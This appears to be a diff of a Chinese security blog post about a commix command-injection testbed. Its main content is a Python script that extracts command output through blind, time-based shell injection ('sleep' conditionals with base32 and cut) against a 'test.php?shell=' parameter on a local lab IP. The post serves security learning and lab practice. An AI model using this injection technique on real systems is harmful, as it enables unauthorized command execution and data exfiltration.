+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">chars&#x3D; &quot;QWERTYUIIOPASDFGHJKLZXCVBNM1234567890&#x3D;&quot;</span><br><span class="line"></span><br><span class="line">def get_length(url,cmd,time):</span><br><span class="line">    data_length&#x3D;&#39;&#39;</span><br><span class="line">    for i in range(1,10):</span><br><span class="line">        for k in range(0,10):</span><br><span class="line">            url1 &#x3D; url + &#39;if [ $(&#123;0&#125;|base32|wc -c|cut -c &#123;1&#125;) &#x3D; &#123;2&#125; ];then sleep 3;fi&#39;.format(cmd,i,k)</span><br><span class="line">            print(url1)</span><br><span class="line">            try:</span><br><span class="line">                res&#x3D;requests.get(url&#x3D;url1,timeout&#x3D;time)</span><br><span class="line">            except:</span><br><span class="line">                print(k)</span><br><span class="line">                data_length +&#x3D; str(k)</span><br><span class="line">                break</span><br><span class="line">    return data_length</span><br><span class="line">def get_content(url,cmd,time,length):</span><br><span class="line">    result&#x3D;&#39;&#39;</span><br><span class="line">    for k in range(length):</span><br><span class="line">        for c in chars:</span><br><span class="line">            url1 &#x3D; url + &#39;if [ $(&#123;0&#125;|base32|cut -c &#123;1&#125;) &#x3D; &#123;2&#125; ];then sleep 3;fi&#39;.format(cmd,k,c)</span><br><span class="line">            try:</span><br><span class="line">                requests.get(url&#x3D;url1,timeout&#x3D;time)</span><br><span class="line">            except:</span><br><span class="line">                result +&#x3D; c</span><br><span class="line">                print(result)</span><br><span class="line">                break</span><br><span class="line">    return result</span><br><span class="line">length&#x3D;int(get_length(&#39;http:&#x2F;&#x2F;192.168.25.129&#x2F;test.php?shell&#x3D;&#39;,&#39;whoami&#39;,2))</span><br><span class="line">result&#x3D;get_content(&#39;http:&#x2F;&#x2F;192.168.25.129&#x2F;test.php?shell&#x3D;&#39;,&#39;whoami&#39;,2,length)</span><br><span class="line">print(base64.b32decode((result)))</span><br></pre></td></tr></table></figure>
 
 
-            
+
+
+
+
+
+
+
+
+
+
+
 
 
         </div>
-    </div>
-    <div id="post-footer" class="post-footer main-content-wrap">
+
         
-        
-            <div class="post-actions-wrap">
-    <nav>
-        <ul class="post-actions post-action-nav">
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/19/极限利用/"
-                    data-tooltip="极限利用"
-                    aria-label="上一篇: 极限利用"
-                >
-                    
-                        <i class="fa fa-angle-left" aria-hidden="true"></i>
-                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
-                    </a>
-            </li>
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/18/volatility/"
-                    data-tooltip="volatility"
-                    aria-label="下一篇: volatility"
-                >
-                    
-                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
-                        <i class="fa fa-angle-right" aria-hidden="true"></i>
-                    </a>
-            </li>
-        </ul>
-    </nav>
-    <ul class="post-actions post-action-share">
-        <li class="post-action hide-lg hide-md hide-sm">
-            <a
-                class="post-action-btn btn btn--default btn-open-shareoptions"
-                href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
-            >
-                <i class="fa fa-share-alt" aria-hidden="true"></i>
-            </a>
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：commix-testbed</li>
+        <li>Post author：p1k</li>
+        <li>Create time：2019-09-19 15:51:10</li>
+        <li>
+            Post link：http://p1keman.github.io/2019/09/19/commix-testbed/
         </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/19/commix-testbed/"
-                    title="分享到 Facebook"
-                    aria-label="分享到 Facebook"
-                >
-                    <i class="fab fa-facebook" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/19/commix-testbed/"
-                    title="分享到 Twitter"
-                    aria-label="分享到 Twitter"
-                >
-                    <i class="fab fa-twitter" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/19/commix-testbed/"
-                    title="分享到 Google+"
-                    aria-label="分享到 Google+"
-                >
-                    <i class="fab fa-google-plus" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-        
-            
-        
-        <li class="post-action">
-            
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
-            
-                <i class="fa fa-list" aria-hidden="true"></i>
-            </a>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
         </li>
     </ul>
 </div>
 
+            </div>
+        
 
         
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2019/09/19/%E6%9E%81%E9%99%90%E5%88%A9%E7%94%A8/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">极限利用</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2019/09/18/volatility/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">volatility</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
         
-            
+
         
     </div>
-</article>
+</div>
 
 
+                
+            </div>
 
-                <footer id="footer" class="main-content-wrap">
-    <span class="copyrights">
-        Copyrights &copy; 2020 John Doe. All Rights Reserved.
-    </span>
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span> -
+            
+            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">p1k</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.3.1</a>
+        </div>
+    </div>
 </footer>
 
-            </div>
-            
-                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
-                    <div class="post-actions-wrap">
-    <nav>
-        <ul class="post-actions post-action-nav">
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/19/极限利用/"
-                    data-tooltip="极限利用"
-                    aria-label="上一篇: 极限利用"
-                >
-                    
-                        <i class="fa fa-angle-left" aria-hidden="true"></i>
-                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
-                    </a>
-            </li>
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/18/volatility/"
-                    data-tooltip="volatility"
-                    aria-label="下一篇: volatility"
-                >
-                    
-                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
-                        <i class="fa fa-angle-right" aria-hidden="true"></i>
-                    </a>
-            </li>
-        </ul>
-    </nav>
-    <ul class="post-actions post-action-share">
-        <li class="post-action hide-lg hide-md hide-sm">
-            <a
-                class="post-action-btn btn btn--default btn-open-shareoptions"
-                href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
-            >
-                <i class="fa fa-share-alt" aria-hidden="true"></i>
-            </a>
-        </li>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
         
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/19/commix-testbed/"
-                    title="分享到 Facebook"
-                    aria-label="分享到 Facebook"
-                >
-                    <i class="fab fa-facebook" aria-hidden="true"></i>
-                </a>
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
             </li>
         
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/19/commix-testbed/"
-                    title="分享到 Twitter"
-                    aria-label="分享到 Twitter"
-                >
-                    <i class="fab fa-twitter" aria-hidden="true"></i>
-                </a>
-            </li>
+
+        <!-- go comment -->
         
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/19/commix-testbed/"
-                    title="分享到 Google+"
-                    aria-label="分享到 Google+"
-                >
-                    <i class="fab fa-google-plus" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-        
-            
-        
-        <li class="post-action">
-            
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
-            
-                <i class="fa fa-list" aria-hidden="true"></i>
-            </a>
-        </li>
     </ul>
 </div>
 
-
-                </div>
-                
-    <div id="share-options-bar" class="share-options-bar" data-behavior="4">
-        <i id="btn-close-shareoptions" class="fa fa-times"></i>
-        <ul class="share-options">
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/19/commix-testbed/"
-                        aria-label="分享到 Facebook"
-                    >
-                        <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
-                    </a>
-                </li>
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/19/commix-testbed/"
-                        aria-label="分享到 Twitter"
-                    >
-                        <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
-                    </a>
-                </li>
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/19/commix-testbed/"
-                        aria-label="分享到 Google+"
-                    >
-                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
-                    </a>
-                </li>
-            
-        </ul>
-    </div>
-
-
-            
         </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
         
 
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
 
-<div id="about">
-    <div id="about-card">
-        <div id="about-btn-close">
-            <i class="fa fa-times"></i>
-        </div>
-        
-            <h4 id="about-card-name">John Doe</h4>
-        
-            <div id="about-card-bio"><p>author.bio</p>
-</div>
-        
-        
-            <div id="about-card-job">
-                <i class="fa fa-briefcase"></i>
-                <br/>
-                <p>author.job</p>
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
 
-            </div>
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
         
-        
-    </div>
+    </ul>
 </div>
 
-        
-        
-<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
-        <!--SCRIPTS-->
-<script src="/assets/js/script-hvks0tjho7hhxxjwgvjgerqzsheh4pu8sgih6uruqsx2fdeiyiflclfy2v4q.min.js"></script>
-<!--SCRIPTS END-->
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Classic-regular-example"><span class="nav-text">Classic regular example</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Classic-Base64-regular-example"><span class="nav-text">Classic (Base64) regular example</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Classic-Hex-regular-example"><span class="nav-text">Classic (Hex) regular example</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Classic-single-quote-example"><span class="nav-text">Classic single-quote example</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Classic-double-quote-example"><span class="nav-text">Classic double-quote example</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Classic-non-space-example"><span class="nav-text">Classic non-space example</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Classic-blacklisting-example"><span class="nav-text">Classic blacklisting example</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Classic-hashing-example"><span class="nav-text">Classic hashing example</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Classic-example-amp-Basic-HTTP-Authentication"><span class="nav-text">Classic example &amp; Basic HTTP Authentication</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Blind-regular-example"><span class="nav-text">Blind regular example</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dnslog"><span class="nav-text">dnslog</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="nav-text">延时注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sed"><span class="nav-text">sed</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cut"><span class="nav-text">cut</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#time-rce"><span class="nav-text">time rce</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wc%E5%91%BD%E4%BB%A4"><span class="nav-text">wc命令</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
 
 
     
 
+</main>
 
 
 
-    </body>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
 </html>
